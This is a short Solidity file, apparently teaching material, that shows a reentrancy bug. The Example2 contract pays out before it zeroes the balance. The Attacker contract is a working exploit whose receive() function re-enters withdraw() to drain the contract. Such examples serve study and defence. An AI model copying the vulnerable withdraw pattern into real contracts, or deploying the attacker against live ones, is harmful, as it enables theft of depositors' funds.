// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/* 
* @dev This contracts includes an example of a reentrancy bug
*/

contract Example2 {
    mapping (address => uint256) balance;
	
    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }
	
	function withdraw() external {		
		require(balance[msg.sender] > 0, "Saldo cero!");	
		(bool success, ) = payable(msg.sender).call{value: balance[msg.sender]}("");
		require(success, "Low level call failed");
		balance[msg.sender] = 0;	
	}
	
	function banksBalance () public view returns (uint256) {
		return address(this).balance;
	}
	
	function userBalance (address user) public view returns (uint256) {
		return balance[user];
	}
}


contract Attacker {
	Example2 public target;
	
	constructor(address _target) {
		target = Example2(_target);
	}
	
	function exploit() external payable {
		target.deposit{value: 1 ether}();
		target.withdraw();
	}
	
	receive() external payable {
		if (target.banksBalance() > 1 ether) {
			target.withdraw();
		}
	}
	
	function getBalance() public view returns (uint256) {
		return address(this).balance;
	}
}